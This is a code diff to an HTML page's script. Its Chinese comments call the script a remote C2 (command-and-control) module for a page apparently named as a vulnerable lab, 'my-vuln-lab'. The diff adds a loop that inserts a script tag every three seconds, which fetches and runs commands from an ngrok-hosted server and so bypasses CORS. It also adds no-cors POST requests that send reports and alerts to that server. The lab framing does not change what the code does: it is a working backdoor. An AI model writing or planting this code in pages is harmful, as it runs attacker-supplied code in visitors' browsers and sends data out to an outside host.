@@ -66,22 +66,29 @@
 
     <script>
         // --------------------------------------------------
-        // 🔥 遠端 C2 雙向通訊模組 (已對接 ngrok)
+        // 🔥 繞過 CORS 的遠端 C2 雙向通訊模組
         // --------------------------------------------------
         const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';
 
-        setInterval(async () => {
+        // 1. 利用動態插入 <script> 抓取並執行 C2 指令（徹底繞過 CORS）
+        setInterval(() => {
             try {
-                let res = await fetch(`${C2_SERVER}/api/get-command`);
-                let data = await res.json();
-                if (data.cmd) eval(data.cmd);
+                let oldScript = document.getElementById('c2-polling-script');
+                if (oldScript) oldScript.remove();
+
+                let script = document.createElement('script');
+                script.id = 'c2-polling-script';
+                script.src = `${C2_SERVER}/api/get-command?t=` + Date.now();
+                document.head.appendChild(script);
             } catch (e) {}
         }, 3000);
 
+        // 2. 利用 mode: 'no-cors' 發送回報日誌（只發送不讀取回應）
         async function reportToComputer(msg) {
             try {
                 await fetch(`${C2_SERVER}/api/report`, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ data: msg })
                 });
@@ -92,13 +99,14 @@
             try {
                 await fetch(`${C2_SERVER}/api/report-alert`, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ alert: alertMsg })
                 });
             } catch (e) {}
         }
 
-        reportToComputer("整合型靶場 my-vuln-lab 已上線！");
+        reportToComputer("整合型靶場 my-vuln-lab 已透過繞過 CORS 方式上線！");
         // --------------------------------------------------
 
         const db = {
